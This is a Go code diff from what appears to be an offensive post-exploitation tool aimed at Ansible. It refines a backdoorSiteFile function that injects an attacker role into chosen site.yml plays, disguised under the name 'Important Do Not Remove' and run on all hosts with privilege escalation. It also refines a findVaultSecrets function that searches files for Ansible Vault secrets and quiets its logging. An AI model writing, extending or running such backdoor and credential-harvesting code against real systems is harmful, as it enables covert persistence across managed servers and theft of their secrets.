@@ -36,11 +36,13 @@ type ansibleFiles struct {
 }
 
 type ansible []struct {
-	Name   string        `json:"name,omitempty"`
-	Hosts  string        `json:"hosts,omitempty"`
-	Become bool          `json:"become,omitempty"`
-	Roles  []string      `json:"roles,flow,omitempty"`
-	Tasks  []interface{} `json:"tasks,omitempty"`
+	Name        string        `json:"name,omitempty"`
+	Hosts       string        `json:"hosts,omitempty"`
+	Become      bool          `json:"become,omitempty"`
+	GatherFacts string        `json:"gather_facts,omitempty"`
+	Include     string        `json:"include,omitempty"`
+	Roles       []string      `json:"roles,flow,omitempty"`
+	Tasks       []interface{} `json:"tasks,omitempty"`
 }
 
 var (
@@ -376,6 +378,8 @@ func backdoorSiteFile() {
 				"Important Do Not Remove",
 				"all",
 				true,
+				"",
+				"",
 				[]string{ansibleRole},
 				nil,
 			}}
@@ -387,12 +391,16 @@ func backdoorSiteFile() {
 		}
 	}
 	moseutils.Msg("The following steps were found in the site.yml file:")
-
+	validIndex := make(map[int]bool, 0)
 	for i, hosts := range unmarshalled {
-		moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, hosts.Roles)
+		if hosts.Include == "" {
+			moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, hosts.Roles)
+			validIndex[i] = true
+		}
+
 	}
 
-	if ans, err := moseutils.AskUserQuestionCommaIndex("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget); err == nil {
+	if ans, err := moseutils.AskUserQuestionCommaIndex("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget, validIndex); err == nil {
 		for i, _ := range unmarshalled {
 			if ans[i] { // Check if current step in answer
 				if unmarshalled[i].Roles == nil {
@@ -432,13 +440,12 @@ func findVaultSecrets() {
 		}
 		// Matches for secrets
 		reg := regexp.MustCompile(`(?ms)\$ANSIBLE_VAULT`)
-		var matches []string
 		// Translate secrets on the fly
-		log.Println(fileLoc)
 		for _, file := range ansibleFiles {
-			// Grep for ENC[
-			log.Printf("Attempting viewing of %v", file)
-			matches = moseutils.GrepFile(file, reg)
+			matches := moseutils.GrepFile(file, reg)
+			if debug {
+				log.Printf("Checking if secret in file %v", file)
+			}
 			if len(matches) > 0 {
 				if envPass != "" {
 					moseutils.Msg("Found secret(s) in file: %s", file)
